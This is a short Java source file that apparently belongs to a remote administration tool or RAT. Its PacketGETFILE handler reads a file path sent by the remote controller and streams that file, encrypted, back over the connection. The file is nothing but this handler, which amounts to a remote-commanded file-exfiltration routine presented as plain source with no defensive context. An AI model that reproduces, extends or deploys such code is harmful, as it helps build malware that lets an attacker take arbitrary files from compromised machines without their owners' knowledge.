package com.redpois0n.packets;

import java.io.File;

import com.redpois0n.Connection;
import com.redpois0n.Main;
import com.redpois0n.common.io.FileIO;


public class PacketGETFILE extends Packet {

	@Override
	public void read(String line) throws Exception {
		File file = new File(Connection.readLine());	
		
		if (file.exists() && file.isFile()) {		
			Connection.addToSendQueue(new PacketBuilder(Header.SEND_FILE, new String[] { file.getName(), file.getAbsolutePath() }));
			
			Connection.lock();
			FileIO.writeFile(file, Connection.dos, null, Main.getKey());
			Connection.lock();
		}	
	}

}
